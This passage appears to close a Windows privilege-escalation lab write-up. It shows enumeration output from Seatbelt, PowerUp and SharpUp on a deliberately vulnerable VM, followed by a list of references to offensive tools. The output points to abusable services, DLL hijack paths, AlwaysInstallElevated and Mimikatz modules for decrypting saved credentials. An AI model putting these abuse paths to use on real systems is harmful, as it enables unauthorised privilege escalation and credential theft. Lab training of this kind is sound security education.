  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
  CommonProgramFiles(x86)             : C:\Program Files (x86)\Common Files
  ProgramFiles(x86)                   : C:\Program Files (x86)
  PROCESSOR_LEVEL                     : 6
  LOGONSERVER                         : \\WIN-QBA94KB3IOF
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  HOMEDRIVE                           : C:
  SystemRoot                          : C:\Windows
  SESSIONNAME                         : RDP-Tcp#0
  ALLUSERSPROFILE                     : C:\ProgramData
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  APPDATA                             : C:\Users\user\AppData\Roaming
  PROCESSOR_REVISION                  : 4f01
  USERNAME                            : user
  CommonProgramW6432                  : C:\Program Files\Common Files
  CommonProgramFiles                  : C:\Program Files\Common Files
  CLIENTNAME                          : kali
  OS                                  : Windows_NT
  USERDOMAIN_ROAMINGPROFILE           : WIN-QBA94KB3IOF
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  ComSpec                             : C:\Windows\system32\cmd.exe
  PROMPT                              : $P$G
  SystemDrive                         : C:
  TEMP                                : C:\Users\user\AppData\Local\Temp\2
  ProgramFiles                        : C:\Program Files
  NUMBER_OF_PROCESSORS                : 1
  TMP                                 : C:\Users\user\AppData\Local\Temp\2
  ProgramData                         : C:\ProgramData
  ProgramW6432                        : C:\Program Files
  windir                              : C:\Windows
  USERDOMAIN                          : WIN-QBA94KB3IOF
  PUBLIC                              : C:\Users\Public


=== System Environment Variables ===

  ComSpec                             : C:\Windows\system32\cmd.exe
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  OS                                  : Windows_NT
  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  PROCESSOR_ARCHITECTURE              : AMD64
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  TEMP                                : C:\Windows\TEMP
  TMP                                 : C:\Windows\TEMP
  USERNAME                            : SYSTEM
  windir                              : C:\Windows
  NUMBER_OF_PROCESSORS                : 1
  PROCESSOR_LEVEL                     : 6
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  PROCESSOR_REVISION                  : 4f01


=== User Folders ===

  Folder                                Last Modified Time
  C:\Users\admin                      : 6/5/2020 8:36:24 AM
  C:\Users\Administrator              : 6/4/2020 6:12:00 PM
  C:\Users\user                       : 6/5/2020 8:38:06 AM


=== Non Microsoft Services (via WMI) ===

  Name             : AmazonSSMAgent
  DisplayName      : Amazon SSM Agent
  Company Name     :
  Description      : Amazon SSM Agent
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
  IsDotNet         : False

  Name             : AWSLiteAgent
  DisplayName      : AWS Lite Guest Agent
  Company Name     : Amazon Inc.
  Description      : AWS Lite Guest Agent
  State            : Running
  StartMode        : Auto
  PathName         : C:\Program Files\Amazon\XenTools\LiteAgent.exe
  IsDotNet         : False

  Name             : daclsvc
  DisplayName      : DACL Service
  Company Name     :
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  IsDotNet         : False

  Name             : dllsvc
  DisplayName      : DLL Hijack Service
  Company Name     :
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
  IsDotNet         : False

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Company Name     :
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  IsDotNet         : False

  Name             : PsShutdownSvc
  DisplayName      : PsShutdown
  Company Name     : Systems Internals
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Windows\PSSDNSVC.EXE
  IsDotNet         : False

  Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     :
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False

  Name             : ssh-agent
  DisplayName      : OpenSSH Authentication Agent
  Company Name     :
  Description      : Agent to hold private keys used for public key authentication.
  State            : Stopped
  StartMode        : Disabled
  PathName         : C:\Windows\System32\OpenSSH\ssh-agent.exe
  IsDotNet         : False

  Name             : unquotedsvc
  DisplayName      : Unquoted Path Service
  Company Name     :
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  IsDotNet         : False

  [X] Exception: The path is not of a legal form.


=== HKCU Internet Settings ===

        DisableCachingOfSSLPages : 1
              IE5_UA_Backup_Flag : 5.0
                 PrivacyAdvanced : 1
                 SecureProtocols : 2688
                      User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
           CertificateRevocation : 1
            ZonesSecurityUpgrade : System.Byte[]
              WarnonZoneCrossing : 1
                 EnableNegotiate : 1
                    MigrateProxy : 1
                     ProxyEnable : 0


=== HKLM Internet Settings ===

                    ActiveXCache : C:\Windows\Downloaded Program Files
              CodeBaseSearchPath : CODEBASE
                  EnablePunycode : 1
                    MinorVersion : 0
                  WarnOnIntranet : 1


=== LAPS Settings ===

  [*] LAPS not installed


=== Local Group Memberships ===

  * Administrators *

    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin

  * Remote Desktop Users *

    NT AUTHORITY\Authenticated Users

  * Distributed COM Users *


  * Remote Management Users *




=== Drive Information (via .NET) ===

  Drive        Mapped Location
  C:\        : C:\


=== Current Host RDP Sessions (qwinsta) ===

  SessionID:       0
  SessionName:     Services
  UserName:
  DomainName:
  State:           Disconnected
  SourceIP:

  SessionID:       1
  SessionName:     Console
  UserName:
  DomainName:
  State:           Connected
  SourceIP:

  SessionID:       2
  SessionName:     RDP-Tcp#0
  UserName:        user
  DomainName:      WIN-QBA94KB3IOF
  State:           Active
  SourceIP:        192.168.144.77



=== Mapped Drives (via WMI) ===



=== Network Shares (via WMI) ===

  Name             : ADMIN$
  Path             : C:\Windows
  Description      : Remote Admin

  Name             : C$
  Path             : C:\
  Description      : Default share

  Name             : IPC$
  Path             :
  Description      : Remote IPC



=== Firewall Rules (Deny) ===

  Current Profile(s)          : PUBLIC

  FirewallEnabled (Domain)    : False
  FirewallEnabled (Private)   : False
  FirewallEnabled (Public)    : False

  [X] Exception: Invalid namespace


=== Process Enumerations ===

  * Potential Defensive Processes *


  * Browser Processes *


  * Other Interesting Processes *

        Name         : cmd.exe
        Product      : Command Prompt
        ProcessID    : 2492
        Owner        : WIN-QBA94KB3IOF\user
        CommandLine  : "C:\Windows\system32\cmd.exe"



=== Registry Auto-logon Settings ===

  DefaultUserName         : admin


=== Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\Autorun Program\program.exe"


=== DNS Cache (via WMI) ===

  Entry         : sls.update.microsoft.com
  Name          : sls.update.microsoft.com
  Data          : glb.sls.prod.dcat.dsp.trafficmanager.net

  Entry         : sls.update.microsoft.com
  Name          : glb.sls.prod.dcat.dsp.trafficmanager.net
  Data          : 135.232.92.137

  Entry         : time.windows.com
  Name          : time.windows.com
  Data          : twc.trafficmanager.net

  Entry         : time.windows.com
  Name          : twc.trafficmanager.net
  Data          : 168.61.215.74



=== Current ARP Table ===


  Interface     : Loopback Pseudo-Interface 1 (127.0.0.1) --- Index 1
    DNS Servers : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static


  Interface     : Ethernet (10.66.172.123) --- Index 15
    DNS Servers : 10.66.0.2

    Internet Address      Physical Address      Type
    10.10.0.1             00-00-00-00-00-00     Invalid
    10.66.128.1           02-C7-F0-88-1A-CD     Dynamic
    10.66.191.255         FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    255.255.255.255       FF-FF-FF-FF-FF-FF     Static


=== Active TCP Network Connections ===

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:135            0.0.0.0:0              LISTEN     968   RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:3389           0.0.0.0:0              LISTEN     828   TermService     svchost.exe
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     640                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     980   EventLog        svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     628   SessionEnv      svchost.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     768                   lsass.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     1928  Spooler         spoolsv.exe
  0.0.0.0:49670          0.0.0.0:0              LISTEN     1800  PolicyAgent     svchost.exe
  0.0.0.0:49671          0.0.0.0:0              LISTEN     752                   services.exe
  10.66.172.123:139      0.0.0.0:0              LISTEN     4                     System
  10.66.172.123:3389     192.168.144.77:40116   ESTAB      828   TermService     svchost.exe
  10.66.172.123:50190    135.232.92.137:443     SYN_SENT   628   DsmSvc          svchost.exe


=== Active UDP Network Connections ===

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            1260   W32Time                 svchost.exe
  0.0.0.0:500            628    IKEEXT                  svchost.exe
  0.0.0.0:3389           828    TermService             svchost.exe
  0.0.0.0:4500           628    IKEEXT                  svchost.exe
  0.0.0.0:5353           1328   Dnscache                svchost.exe
  0.0.0.0:5355           1328   Dnscache                svchost.exe
  10.66.172.123:137      4                              System
  10.66.172.123:138      4                              System
  127.0.0.1:62451        628    iphlpsvc                svchost.exe


=== Non Microsoft Processes (via WMI) ===

  Name           : Seatbelt
  Company Name   :
  PID            : 5472
  Path           : C:\PrivEsc\Seatbelt.exe
  CommandLine    : Seatbelt.exe  all
  IsDotNet       : True



=== Kerberos Tickets (Current User) ===

  [*] Returned 0 tickets


=== Running User Triage Checks ===


 [*] In medium integrity, attempting triage of current user.

     Current user : WIN-QBA94KB3IOF\user - S-1-5-21-3025105784-3259396213-1915610826-1000


=== Checking for Firefox (Current User) ===



=== Checking for Chrome (Current User) ===



=== Internet Explorer (Current User) Last 7 Days ===

  History:

  Favorites:
    http://go.microsoft.com/fwlink/p/?LinkId=255142


=== Checking Windows Vaults ===

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials


  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials



=== Saved RDP Connection Information (Current User) ===


=== Recent Typed RUN Commands (Current User) ===



=== Putty Saved Session Information (Current User) ===

    SessionName           :  BWP123F42



=== Putty SSH Host Key Recent Hosts (Current User) ===



=== Checking for Cloud Credentials (Current User) ===



=== Recently Accessed Files (Current User) Last 7 Days ===



=== Checking for DPAPI Master Keys (Current User) ===

    Folder       : C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3025105784-3259396213-1915610826-1000

    MasterKey    : ced3b33f-849e-4587-8829-fbaf4cd747a7
        Accessed : 6/5/2020 8:38:04 AM
        Modified : 6/5/2020 8:38:04 AM

  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/rpc) to decrypt


=== Checking for Credential Files (Current User) ===

    Folder       : C:\Users\user\AppData\Local\Microsoft\Credentials\

    CredFile     : DFBE70A7E5CC19A398EBF1B96859CE5D
    Description  : Local Credential Data
    MasterKey    : ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed     : 6/5/2020 8:38:04 AM
    Modified     : 6/5/2020 8:38:04 AM
    Size         : 11152

  [*] Use the Mimikatz "dpapi::cred" module with appropriate /masterkey to decrypt


=== Checking for RDCMan Settings Files (Current User) ===



=== Internet Explorer Open Tabs ===



=== Installed Patches (via WMI) ===

  HotFixID   InstalledOn    Description
  KB4514366  9/7/2019       Update
  KB4512577  9/7/2019       Security Update
  KB4512578  9/7/2019       Security Update


=== Chrome (Current User) ===


=== Firefox (Current User) ===


=== Recycle Bin Files Within the last 30 Days ===



=== Interesting Files (Current User) ===



[*] Completed All Safety Checks in 2 seconds


C:\PrivEsc>
```

**PowerUp.ps1** execution:

```powershell
PS C:\PrivEsc> . .\PowerUp.ps1
PS C:\PrivEsc> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName   : AWSLiteAgent
Path          : C:\Program Files\Amazon\XenTools\LiteAgent.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'AWSLiteAgent' -Path <HijackPath>

ServiceName   : unquotedsvc
Path          : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'unquotedsvc' -Path <HijackPath>





[*] Checking service executable and argument permissions...


ServiceName    : filepermsvc
Path           : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile : C:\Program Files\File Permissions Service\filepermservice.exe
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -ServiceName 'filepermsvc'





[*] Checking service permissions...


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'





[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Temp\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Temp\\wlbsctrl.dll' -Command '...'

HijackablePath : C:\Users\user\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\user\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'





[*] Checking for AlwaysInstallElevated registry key...


OutputFile    :
AbuseFunction : Write-UserAddMSI





[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : C:\Program Files\Autorun Program\program.exe





[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS C:\PrivEsc>
```

**SharpUp.exe** execution:

```bat
C:\PrivEsc>SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : daclsvc
  DisplayName      : DACL Service
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"


=== Modifiable Service Binaries ===

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Description      :
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"


=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1


=== Modifiable Folders in %PATH% ===

  Modifable %PATH% Folder  : C:\Temp


=== Modifiable Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Program Files\Autorun Program\program.exe


=== *Special* User Privileges ===



=== Unattended Install Files ===

 C:\Windows\Panther\Unattend.xml


=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 1 seconds


C:\PrivEsc>
```

---------------------------------------------------------------------------------------

## References

- [AccessChk - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [cmdkey - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
- [copy - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/copy)
- [creddump7 - GitHub](https://github.com/Tib3rius/creddump7)
- [creddump7 - Kali Tools](https://www.kali.org/tools/creddump7/)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [msiexec - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec)
- [net (command) - Wikipedia](https://en.wikipedia.org/wiki/Net_(command))
- [Pass the hash - Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)
- [Passing-the-hash - Kali Tools](https://www.kali.org/tools/passing-the-hash/)
- [PowerTools - GitHub](https://github.com/PowerShellEmpire/PowerTools/)
- [PowerUp - GitHub](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [PrintSpoofer - GitHub](https://github.com/itm4n/PrintSpoofer)
- [PsExec - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [reg add - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add)
- [reg query - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)
- [runas - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771525(v=ws.11))
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [RoguePotato - GitHub](https://github.com/antonioCoco/RoguePotato)
- [Sc config - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc990290(v=ws.11))
- [Sc qc - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11))
- [Seatbelt - GitHub](https://github.com/GhostPack/Seatbelt)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [SharpUp - GitHub](https://github.com/GhostPack/SharpUp)
- [socat - Docs](http://www.dest-unreach.org/socat/doc/socat.html)
- [socat - Homepage](http://www.dest-unreach.org/socat/)
- [socat - Linux manual page](https://linux.die.net/man/1/socat)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
- [Windows Registry - Wikipedia](https://en.wikipedia.org/wiki/Windows_Registry)
- [winexe - Kali Tools](https://www.kali.org/tools/samba/#winexe)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
